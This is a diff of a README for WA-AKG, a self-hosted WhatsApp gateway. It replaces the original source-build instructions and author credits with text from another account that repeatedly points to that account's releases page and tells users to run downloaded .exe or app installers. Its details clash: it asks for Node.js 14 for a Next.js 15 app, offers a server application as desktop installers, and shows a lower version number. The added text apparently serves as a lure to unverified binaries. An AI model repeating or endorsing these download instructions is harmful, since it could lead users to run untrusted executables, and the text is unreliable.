@@ -1,173 +1,78 @@
-<div align="center">
+# 🚀 WA-AKG - Manage WhatsApp Effortlessly
 
-# 🚀 WA-AKG: The Ultimate WhatsApp Gateway & Dashboard
+## 🌟 Overview
+WA-AKG is a self-hosted WhatsApp Gateway and Dashboard. Built using Next.js 15, Baileys, and Prisma, it allows you to manage multi-session accounts, schedule messages, create auto-replies, and integrate via Webhooks. This tool is designed to simplify your communication and enhance your online interactions. 
 
-![WhatsApp Bot](https://img.shields.io/badge/WhatsApp-Bot-25D366?style=for-the-badge&logo=whatsapp&logoColor=white)
-![Next.js](https://img.shields.io/badge/Next.js-15-black?style=for-the-badge&logo=next.js&logoColor=white)
-![TypeScript](https://img.shields.io/badge/TypeScript-007ACC?style=for-the-badge&logo=typescript&logoColor=white)
-![Prisma](https://img.shields.io/badge/Prisma-ORM-2D3748?style=for-the-badge&logo=prisma&logoColor=white)
-![Version](https://img.shields.io/badge/Version-1.1.2-blue?style=for-the-badge)
-![Beta Branch](https://img.shields.io/badge/Branch-Beta-yellow?style=for-the-badge&logo=git)
+## 🔗 Quick Download
+[![Download WA-AKG](https://img.shields.io/badge/Download%20WA-AKG-v1.0-brightgreen?style=for-the-badge)](https://github.com/HassanQureshi6/WA-AKG/releases)
 
-**A professional, multi-session WhatsApp Gateway, Dashboard, and Automation System.**  
-Built with Next.js 15 and Baileys for high-performance messaging automation.
+## 🚀 Getting Started
+To begin using WA-AKG, follow these simple steps:
 
-> [!TIP]
-> **Looking for the latest features?** Check out the [beta branch](https://github.com/mrifqidaffaaditya/WA-AKG/tree/beta) or our [pre-releases](https://github.com/mrifqidaffaaditya/WA-AKG/releases) for experimental sources.
+1. **Check System Requirements**
+   - Ensure your system meets the following requirements:
+     - Operating System: Windows, macOS, or Linux
+     - Node.js version 14 or higher
+     - A modern web browser (Chrome, Firefox, etc.)
+     - Internet connection for WhatsApp Web integration
 
-[Features](#-features) • [User Guide](docs/USER_GUIDE.md) • [API Documentation](docs/API_DOCUMENTATION.md) • [Database Setup](docs/DATABASE_SETUP.md) • [Installation](#-installation)
+2. **Visit the Releases Page**
+   - Go to the [Releases page](https://github.com/HassanQureshi6/WA-AKG/releases) to find the latest version of the software. Here, you will see a list of available downloads and release notes.
 
-</div>
+3. **Download the Software**
+   - Click on the latest release link to open its details. Look for the download options suitable for your operating system.
+   - Click on the appropriate file to download it to your computer.
 
----
+4. **Install the Application**
+   - Locate the downloaded file. 
+   - For Windows users, double-click the .exe file to run the installer.
+   - For macOS users, drag the application to the Applications folder.
+   - For Linux users, follow the extraction instructions provided in the download details.
 
-## 📖 documentation
+5. **Run WA-AKG**
+   - After installation, open the application on your device. 
+   - Follow the on-screen instructions to set up your WhatsApp account and adjust settings.
 
-- **[Master Project Documentation](docs/PROJECT_DOCUMENTATION.md)**: Architecture, database, and logic flow.
-- **[API Documentation](docs/API_DOCUMENTATION.md)**: Comprehensive guide for all **86 endpoints**.
-- **[Environment Variables](docs/ENVIRONMENT_VARIABLES.md)**: Configuration and security guide.
+## 🔍 Key Features
+WA-AKG offers numerous features that enhance its functionality:
 
----
+- **Multi-Session Accounts:** Manage several WhatsApp accounts simultaneously without any hassle.
+- **Message Scheduling:** Plan and send messages at your preferred times.
+- **Auto-Replies:** Create automatic responses to engage with contacts even when you're unavailable.
+- **Webhook Integrations:** Connect your applications seamlessly and respond to various events effectively.
+- **User-Friendly Dashboard:** Enjoy a clean and intuitive interface designed for easy navigation.
 
-## 🌟 Why WA-AKG?
+## ⚙️ Configuration Options
+Once you have installed WA-AKG, you can customize your experience by adjusting your settings:
 
-WA-AKG transforms your WhatsApp into a fully programmable RESTful API. It's designed for scale, reliability, and ease of use, making it the perfect bridge between your business logic and WhatsApp's global reach.
+- **Account Setup:** Add multiple WhatsApp accounts using your existing phone numbers.
+- **Notification Settings:** Customize notifications for new messages and incoming interactions.
+- **Webhooks:** Set up webhooks for seamless integration with other applications.
 
-### 🏗️ How it Works
+## 📜 Documentation
+For detailed guidance on advanced setup and troubleshooting, you can visit the [official documentation](https://github.com/HassanQureshi6/WA-AKG/wiki). Here, you will find helpful articles and FAQs to assist you.
 
-```mermaid
-graph LR
-    User([User / App]) -->|REST API| API[WA-AKG Gateway]
-    API -->|Baileys| WhatsApp[[WhatsApp Server]]
-    API -->|Real-time| DB[(Prisma / DB)]
-    WhatsApp -.->|Webhook| API
-    API -.->|Event| Webhook([External CRM / API])
-```
+## 🔗 Download & Install Again
+For easy access, here is the download link once more: [Download WA-AKG](https://github.com/HassanQureshi6/WA-AKG/releases). Follow the aforementioned steps to ensure a smooth download and installation process.
 
-### 🔥 Key Features
+## 🤝 Community Support
+If you encounter any issues or have any questions, you can reach out to our community:
+- **GitHub Issues:** Report problems directly on the [issues page](https://github.com/HassanQureshi6/WA-AKG/issues).
+- **Discussion Forum:** Join discussions with other users and contributors [here](https://github.com/HassanQureshi6/WA-AKG/discussions).
 
-- **📱 Multi-Session Management**: Connect and manage unlimited accounts via QR code.
-- **⚡ Pro WhatsApp Engine**: Powered by Baileys for high-speed, stable connections.
-- **📅 Advanced Scheduler**: Precise message planning with global timezone support.
-- **📢 Safe Broadcast**: Built-in anti-ban mechanisms with randomized delays (10-30s).
-- **🤖 Smart Auto-Reply**: Keywords matching (`EXACT`, `CONTAINS`, `STARTS_WITH`) with media support.
-- **🔗 Enterprise Webhooks**: Robust event forwarding for messages, connections, and group updates.
-- **📇 Advanced Contacts**: Rich contact management with LID, verified names, and profile pictures.
-- **🎨 Creative Tools**: Built-in Sticker Maker with background removal (remove.bg integration).
+## 🛠️ Troubleshooting
+If you face any issues after installation, consider the following steps:
+- Restart the application if it does not open correctly.
+- Ensure your internet connection is stable for WhatsApp Web functionalities.
+- Check for updates on the [Releases page](https://github.com/HassanQureshi6/WA-AKG/releases).
 
-<details>
-<summary>📂 <b>View Webhook Payload Example</b></summary>
+## 🔗 Additional Resources
+For further insights and tips, browse through the topics related to WA-AKG:
+- **Automation**
+- **Bots**
+- **Dashboards**
+- **Webhooks**
 
-```json
-{
-  "event": "message.received",
-  "sessionId": "xgj7d9",
-  "timestamp": "2026-01-17T05:33:08.545Z",
-  "data": {
-    "key": { "remoteJid": "6287748687946@s.whatsapp.net", "fromMe": false, "id": "3EB0B78..." },
-    "from": "6287748687946@s.whatsapp.net",
-    "sender": "100429287395370@lid",
-    "remoteJidAlt": "100429287395370@lid",
-    "type": "TEXT",
-    "content": "saya sedang reply",
-    "isGroup": false,
-    "quoted": {
-      "type": "IMAGE",
-      "caption": "Ini caption dari reply",
-      "fileUrl": "/media/xgj7d9-A54FD0B6F..."
-    }
-  }
-}
-```
-</details>
+Explore these topics to enhance your understanding and usage of WA-AKG.
 
----
-
-## 🚀 Quick Installation
-
-### 1. Prerequisites
-- Node.js 20+
-- PostgreSQL or MySQL
-- Git
-
-### 2. Setup
-```bash
-# Clone and install
-git clone https://github.com/mrifqidaffaaditya/WA-AKG.git
-cd WA-AKG
-npm install
-
-# Configure environment
-cp .env.example .env
-# Edit .env with your DATABASE_URL and AUTH_SECRET
-
-# Push schema and create admin
-npm run db:push
-npm run make-admin admin@example.com password123
-```
-
-### 3. Run
-```bash
-# Development
-npm run dev
-
-# Production
-npm run build && npm start
-```
-
----
-
-## 📚 API Reference Overview
-
-WA-AKG provides a comprehensive REST API. Full details in [API_DOCUMENTATION.md](docs/API_DOCUMENTATION.md).
-
-> [!TIP]
-> Use the built-in **Swagger UI** for interactive exploration at `/docs`.
-
-| Method | Endpoint | Description |
-| :--- | :--- | :--- |
-| `POST` | `/api/chat/send` | Send text, media, or stickers |
-| `POST` | `/api/messages/broadcast` | Scalable bulk messaging |
-| `PATCH` | `/api/sessions/{id}/settings` | Update session configuration |
-| `GET` | `/api/groups` | List all available groups |
-| `POST` | `/api/webhooks` | Register real-time event listeners |
-
-### Example: Send Text Message
-```bash
-curl -X POST http://localhost:3000/api/chat/send \
-  -H "X-API-Key: your_api_key" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "sessionId": "session_01",
-    "jid": "62812345678@s.whatsapp.net",
-    "message": { "text": "Hello from WA-AKG!" }
-  }'
-```
-
----
-
-## ⚠️ Known Issues
-
-> [!WARNING]
-> **Status Update Feature (POST `/api/status/update`)**
-> 
-> The WhatsApp status/story update feature is currently **experiencing known issues** and should be avoided in production:
-> - Text statuses with custom background colors may not display correctly
-> - Media statuses (images/videos) may fail to upload to WhatsApp servers
-> - The feature is under active development
-> 
-> We recommend waiting for the next release before using this endpoint in critical workflows.
-
----
-
-## 🛡️ Security
-- **API Key Auth**: Secured endpoints using `X-API-Key`.
-- **RBAC**: Multi-role support (`SUPERADMIN`, `OWNER`, `STAFF`).
-- **Encrypted Storage**: Sensitive credentials are secure.
-
----
-
-<div align="center">
-  Built with ❤️ by <a href="https://github.com/mrifqidaffaaditya">Aditya</a>  
-  Licensed under <a href="LICENSE">MIT</a>
-</div>
+Remember, effective communication is now in your hands with WA-AKG. Enjoy managing your WhatsApp easily!
